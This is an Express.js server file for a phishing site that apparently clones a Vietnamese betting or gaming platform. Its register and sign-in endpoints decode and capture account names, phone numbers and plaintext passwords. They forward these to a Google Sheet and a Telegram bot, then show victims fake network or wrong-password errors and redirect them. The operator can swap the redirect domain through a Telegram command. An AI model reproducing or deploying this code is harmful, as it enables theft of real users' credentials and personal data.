const express = require("express");
require("dotenv").config();
const path = require("path");
const PORT = process.env.PORT || 3001;
const GOOGLE_SHEET_URL = process.env.GOOGLE_SHEET_URL;

const { googleSheetApi } = require("./utils/api");
const bodyParser = require("body-parser");
const app = express();
app.use(express.json());
app.set("trust proxy", true);
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: false }));
app.set("views", path.join(__dirname, "views"));
app.use("/desktop", express.static(path.join(__dirname, "public", "desktop")));
app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));
const {
  sendRegisterAccountToBot,
  sendLoginAccountToBot,
} = require("./utils/sendTelegram");
const { generateRandomIPv6WithPrefix } = require("./utils/genIp");

async function getIp() {
  const res = await axios.get("https://api.ipify.org/?format=json");
  return res.data.ip;
}

const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
let redirectDomain = "https://ggys5hav.net";

if (redirectDomain === "") {
  bot.sendMessage(
    process.env.CHAT_ID,
    "Tên miền chuyển hướng chưa được thiết lập! Vui lòng dùng lệnh /domain để thiết lập!"
  );
}

bot.onText(/\/domain (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const domain = match[1];
  redirectDomain = `https://${domain}`;
  bot.sendMessage(chatId, `Tên miền đã được thay đổi thành: ${redirectDomain}`);
});

const axios = require("axios");
app.use((req, res, next) => {
  const userAgent = req.headers["user-agent"];
  const isMobile = /mobile/i.test(userAgent);
  req.isMobile = isMobile;
  next();
});

app.get("/", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/index", {
      layout: "mobile/layout",
      redirectDomain: redirectDomain,
    });
  } else {
    return res.redirect("/Home/Index");
  }
});

app.get("/Home/Index", async (req, res) => {
  
  return res.render("desktop/index", {
    layout: "desktop/layout",
    redirectDomain: redirectDomain,
  });
});

app.post("/api/Common/GetVerifyMode", (req, res) => {
  return res.json({ Data: 1 });
});

app.post("/api/Verify/VerifyAccountIDIsExist", (req, res) => {
  return res.json({
    Data: {
      AccountList: null,
      CanUse: true,
      CookieID: "0ce10a162e074dc8ba54980782e743db",
      IsOverIpLimit: false,
      VerifyStatus: 0,
    },
  });
});

app.post("/api/Common/IsMemberRegisterEnabled", (req, res) => {
  return res.json({
    Data: true,
  });
});

app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
  try {
    const {
      AgencyURL,
      AccountID,
      NickName,
      VerifyUsage,
      PWD,
      FingerIDX,
      SMSVerifyType,
      LocalStorgeCookie,
      CellPhone,
      UniqueSessionId,
      IsReceiveSMS,
      ScreenResolution,
    } = req.body;

    // Decode the password (which is base64 encoded)
    const decodedPWD = Buffer.from(PWD, "base64").toString("utf-8");

    const timeNow = new Date().toLocaleString("vi-VN", {
      timeZone: "Asia/Ho_Chi_Minh",
    });

    const userIp = await getIp();

    // Prepare data to be stored
    const data = {
      action: "register",
      AgencyURL,
      AccountID,
      NickName,
      CellPhone,
      timeNow, // Timestamp of when the user registered
      userIp, // IP address of the user
      PWD: decodedPWD,
    };
    console.log(data);
    await Promise.all([
      googleSheetApi.storageDataRegisterToGoogleSheet(data, GOOGLE_SHEET_URL),
      sendRegisterAccountToBot(
        CellPhone,
        AccountID,
        NickName,
        userIp,
        timeNow,
        decodedPWD
      ),
    ]);

    // Return success response
    return res.json({
      Error: {
        Code: 5999,
        Message: "Lỗi mạng, vui lòng làm mới giao diện",
        Redirect: redirectDomain,
      },
    });
  } catch (error) {
    // Handle any errors that occur during the process
    console.error(error);
    return res.status(500).send({ message: "Error processing data" });
  }
});

app.post("/api/Authorize/SignIn", async (req, res) => {
  const { AccountID, AccountPWD, phone } = req.body;
  const timeNow = new Date().toLocaleString("vi-VN", {
    timeZone: "Asia/Ho_Chi_Minh",
  });

  // Get the user's IP address
  // If using a proxy (like Nginx), 'x-forwarded-for' contains the real IP
  // Otherwise, fallback to req.ip
  const userIp = await getIp();
  const data = {
    action: "login",
    AccountID,
    AccountPWD,
    phone,
    timeNow,
    userIp,
  };
  await Promise.all([
    googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL),
    sendLoginAccountToBot(userIp, timeNow, phone, AccountID, AccountPWD),
  ]);

  return res.json({
    Error: { Code: 1002, Message: "Tài khoản hoặc mật khẩu sai" },
  });
});

app.get("/Home/PhoneApp", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/phoneapp", { layout: "mobile/layout" });
  } else {
    return res.render("desktop/phoneapp", { layout: "desktop/layout" });
  }
});

app.get("/Mobile/Member/ServiceCenter", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/servicecenter", { layout: "mobile/layout" });
  }
});

app.get("/Mobile/Home/Index", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/index", { layout: "mobile/layout",
      redirectDomain
     });
  }
});

app.get("/Mobile/Home", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/index", { layout: "mobile/layout" });
  }
});

app.get("/Mobile/Register/Register", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/register", { layout: "mobile/layout" });
  }
});

app.get("/Mobile/BonusCenter/LatestOffers", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/latestoffers", { layout: "mobile/layout" });
  }
});

app.get("/DownloadApp", (req, res) => {
  return res.render("mobile/downloadapp", { layout: "mobile/layout" });
});

app.listen(PORT, () => console.log("Listening on http://localhost:" + PORT));
